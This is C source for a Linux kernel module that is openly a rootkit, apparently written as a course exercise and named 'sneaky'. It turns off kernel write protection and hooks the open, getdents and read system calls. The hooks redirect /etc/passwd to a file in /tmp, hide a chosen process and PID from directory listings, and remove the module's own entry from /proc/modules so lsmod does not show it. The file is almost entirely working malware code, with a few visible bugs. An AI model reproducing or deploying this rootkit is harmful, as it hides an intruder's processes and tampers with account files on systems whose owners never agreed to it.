#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/ctype.h>
#include <asm/cacheflush.h>
#include <linux/moduleparam.h>
//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
//added part
static char* PID = NULL;
static int FD = 0;
module_param(PID,charp,S_IRUSR | S_IWUSR);
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[];
};
//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81059d90;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81059df0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *dirp,unsigned int count);
asmlinkage ssize_t (*original_call_read)(int fd,void* buf,size_t count);
//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "Very, very Sneaky!\n");
  char* lsmod = "/proc/modules";
  if(strcmp(pathname,lsmod) == 0){
   return FD = original_call(pathname,flags); 
  }
  char* origin = "/etc/passwd";
   if(strcmp(pathname,origin) == 0){
    //redirect to the dummy file /tmp/passwd
    char* redir = "/tmp/passwd";
    copy_to_user(pathname,redir, sizeof(redir));
  }
  return original_call(pathname, flags);
}
//Define my version of sneaky getdents
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count){
 printk(KERN_INFO "Very, very Sneaky!\n");
 struct linux_dirent* dir;
 int bytes = 0;
 int sizeRead = original_call_getdents(fd,dirp,count);
 while(bytes < sizeRead){
  char* sneakyPrev = (char*)dir;
  dir = (struct linux_dirent*)((char*)dirp + bytes);
  char sneaky[] = "sneaky_process";
  if(strcmp(dir->d_name,sneaky) == 0 || strcmp(dir->d_name,(const char*)PID) == 0){
    int tmp = dir->d_reclen;
    dir = (struct linux_dirent*)(sneakyPrev);
    dir->d_reclen += tmp;
  }
  bytes += dir->d_reclen;
 }
 return sizeRead;
}
//Define my version of syscall read
asmlinkage ssize_t sneaky_sys_read(int fd,void* buf,size_t count){
  ssize_t realSize = (*original_call_read)(fd,buf,count);
  if(fd == FD){
    char* p = (char*)buf;
    char* record = (char*)buf;
    char* EOF = p + count -1;
    bool flag = false;
    while(p != EOF){
    if(p != EOF && *p == 's'){
      p++;
      if(p != EOF && *p == 'n'){
	p++;
	if(p != EOF && *p == 'e'){
	  p++;
	  if(p != EOF && *p == 'a'){
	    p++;
	    if(p != EOF && *p == 'k'){
	      p++;
	      if(p != EOF && *p == 'y'){
		p++;
		if(p != EOF && *p == '_'){
		  p++;
		  if(p != EOF && *p == 'm'){
		    p++;
		    if(p != EOF && *p == 'o'){
		      p++;
		      if(p != EOF && *p == 'd'){
			record = p - 9;
			flag = true;
			break;
		      }
		      else{
			p++;
		      }
		    }
		    else{
		      p++;
		    }
		  }
		  else{
		    p++;
		  }
		}
		else{
		  p++;
		}
	      }
	      else{
		p++;
	      }
	    }
	    else{
	      p++;
	    }
	  }
	  else{
	    p++;
	  }
	}
	else{
	  p++;
	}
      }
      else{
	p++;
      }
    }
    else{
      p++;
    }
    }
    if(flag == true){
      char* tmp = record;
      int count = 0;
    while(*tmp != '\n'){
      
      tmp++;
      count++;
    }
    count++;
    while((record+count) != EOF){
      *record = *(record + count);
      record++;
    }
    realSize -= count;
    }
  }
  return realSize;
}
//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  //sneaky getdents
  original_call_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
  //sneaky read
  original_call_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloadin
